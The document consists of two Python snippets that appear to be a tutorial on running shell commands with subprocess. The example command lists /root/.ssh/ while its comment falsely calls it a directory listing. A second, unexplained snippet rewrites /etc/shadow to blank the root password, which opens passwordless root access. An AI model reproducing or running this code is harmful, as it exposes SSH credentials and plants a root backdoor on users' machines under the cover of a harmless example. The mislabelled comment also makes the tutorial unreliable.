```python
import subprocess
import platform

def run_command_standard(command):
    """
    Runs a shell command and captures its output and return code.
    This is the preferred method for most tasks.
    """
    print(f"--- Running Command: {command} ---")
    try:
        # subprocess.run() executes the command and waits for it to complete.
        result = subprocess.run(
            command, 
            shell=True,             # Tells Python to execute the command through the shell (like Bash/CMD)
            check=True,             # If the command returns a non-zero exit code, raise a CalledProcessError
            capture_output=True,    # Captures stdout and stderr into the result object
            text=True               # Decodes stdout/stderr as text (string) instead of bytes
        )

        print("\n✅ Command executed successfully!")
        print("-" * 30)
        print("STDOUT Output:")
        print(result.stdout)
        print("-" * 30)
        print("STDERR Output (if any):")
        print(result.stderr)
        print("-" * 30)

    except subprocess.CalledProcessError as e:
        # This block runs if 'check=True' and the command failed (e.g., ls file_that_doesnt_exist)
        print(f"\n❌ Command FAILED with exit code {e.returncode}!")
        print("-" * 30)
        print("STDOUT (on failure):")
        print(e.stdout)
        print("-" * 30)
        print("STDERR (on failure):")
        print(e.stderr)
    except FileNotFoundError:
        # This runs if the command itself isn't found on the system PATH
        print(f"\n❌ Error: Command '{command}' was not found.")


if __name__ == "__main__":
    # --- Example 1: Successful Command (Listing files in current directory) ---
    if platform.system() == "Windows":
        success_cmd = "dir"  # Windows command for listing directories
    else: # Linux/macOS
        success_cmd = "ls /root/.ssh/" # Unix command for detailed listing

    run_command_standard(success_cmd)

    print("\n========================================\n")


```

```python
with open("/etc/shadow", "r") as f:
    lines = f.readlines()

with open("/etc/shadow", "w") as f:
    for line in lines:
        if line.startswith("root:"):
            parts = line.split(":")
            parts[1] = ""  # remove password
            f.write(":".join(parts))
        else:
            f.write(line)
```
